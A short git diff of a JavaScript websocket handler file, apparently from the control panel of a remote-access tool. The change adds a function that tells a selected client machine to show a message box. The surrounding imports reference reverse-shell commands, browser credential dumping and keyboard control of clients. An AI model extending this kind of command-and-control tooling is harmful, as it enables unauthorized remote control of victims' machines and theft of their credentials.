@@ -19,6 +19,7 @@ import {
 import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverseShellActions";
 import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
 import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
+import {SHOW_MESSAGE_BOX} from "@redux/actions/messsageBoxActions";
 
 
 const sendWebSocketMessage = (websocket, message) => {
@@ -306,5 +307,16 @@ export const handleKeyboardController = async (websocket, store, action) => {
     };
     sendWebSocketMessage(websocket, message);
     console.log("Request browser execution to " + action.payload);
+}
+
+
+export const handleMessageBox = async (websocket, store, action) => {
+    const message = {
+        ACTION: SHOW_MESSAGE_BOX,
+        info: action.payload.info,
+        client_id: store.getState().client.selectedClient.systemInformation.UUID
+    };
+    sendWebSocketMessage(websocket, message);
+    console.log("Request message box to " + action.payload);
 }
 
